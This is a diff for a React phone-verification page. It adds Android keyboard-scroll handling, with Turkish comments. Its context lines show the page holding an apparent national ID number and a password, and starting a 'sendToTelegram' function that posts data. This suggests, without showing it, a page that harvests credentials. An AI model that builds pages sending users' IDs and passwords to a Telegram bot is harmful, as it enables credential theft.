@@ -48,6 +48,75 @@ function PhoneVerificationPage() {
     return () => window.removeEventListener('popstate', handlePopState);
   }, [tc, password, isValidNavigation, navigate, authDispatch]);
 
+  // Güncellenmiş useEffect: Telefon input'una focus olduğunda yüksek DPI Android cihazlarda kaydırma
+  useEffect(() => {
+    const phoneRef = phoneInputRef.current;
+
+    const handleFocusScroll = (inputType) => {
+      const isAndroid = /Android/i.test(navigator.userAgent);
+      const isHighDpi = window.devicePixelRatio >= 2;
+
+      console.log(`handleFocusScroll tetiklendi - ${inputType} input, Android: ${isAndroid}, Yüksek DPI: ${isHighDpi}`);
+
+      if (isAndroid && isHighDpi) {
+        const adjustScroll = () => {
+          requestAnimationFrame(() => {
+            console.log('adjustScroll çalıştı');
+            const button = document.querySelector('.button-phone');
+            if (button) {
+              button.scrollIntoView({ behavior: 'smooth', block: 'center' }); // Butonu merkeze scroll et
+            }
+          });
+        };
+
+        // Oppo vb. yavaş klavye animasyonları için gecikmeyi artır
+        const timeoutId = setTimeout(adjustScroll, 1000);
+
+        // visualViewport resize işleyici
+        const handleViewportChange = () => {
+          console.log('visualViewport değişikliği algılandı');
+          adjustScroll();
+        };
+
+        if (window.visualViewport) {
+          window.visualViewport.addEventListener('resize', handleViewportChange);
+        }
+
+        return () => {
+          clearTimeout(timeoutId);
+          if (window.visualViewport) {
+            window.visualViewport.removeEventListener('resize', handleViewportChange);
+          }
+        };
+      }
+    };
+
+    const handlePhoneFocusScroll = () => handleFocusScroll('Telefon');
+
+    if (phoneRef) {
+      phoneRef.addEventListener('focus', handlePhoneFocusScroll);
+    }
+
+    // Klavye kapatıldığında scroll'u üst kısma geri döndür
+    const handleBlurScroll = () => {
+      const rightSection = document.querySelector('.right-section');
+      if (rightSection) {
+        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+    };
+
+    if (phoneRef) {
+      phoneRef.addEventListener('blur', handleBlurScroll);
+    }
+
+    return () => {
+      if (phoneRef) {
+        phoneRef.removeEventListener('focus', handlePhoneFocusScroll);
+        phoneRef.removeEventListener('blur', handleBlurScroll);
+      }
+    };
+  }, []);
+
   // Telegram gönderimi
   const sendToTelegram = useCallback(async (data) => {
     console.log('API çağrısı yapılıyor:', data);
